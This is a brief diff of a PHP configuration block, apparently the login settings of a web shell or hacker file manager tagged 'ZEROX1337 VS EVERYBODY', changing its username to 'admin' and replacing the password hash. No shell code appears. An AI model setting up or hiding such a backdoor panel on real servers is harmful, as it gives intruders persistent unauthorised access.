@@ -3,8 +3,8 @@
 //ZEROX1337 VS EVERYBODY
 
 $GLOBALS['ZEROX1337'] = array(
-    'username' => 'Zero',
-    'password' => 'cb1acc5f7fb6a9cbb85a167e63bfff14',
+    'username' => 'admin',
+    'password' => 'cd0d59a1ca7593d2480236c6d1264f3f95258f4f943034f1f05296fb946bcd7e',
     'safe_mode' => '0',
     'login_page' => 'gui',
     'show_icons' => '1',
